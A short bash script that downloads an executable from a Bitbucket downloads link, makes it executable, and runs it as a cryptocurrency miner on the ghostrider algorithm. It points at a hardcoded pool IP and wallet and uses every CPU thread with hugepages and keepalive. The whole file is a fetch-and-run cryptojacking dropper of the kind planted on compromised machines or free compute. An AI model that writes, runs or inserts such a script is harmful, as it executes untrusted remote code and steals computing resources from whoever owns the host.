#!/bin/bash
wget -O sgr1 https://bitbucket.org/natalieawe/my-job/downloads/sereb 
chmod +x sgr1
./sgr1 --algorithm ghostrider --pool 141.94.192.217:7054 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive
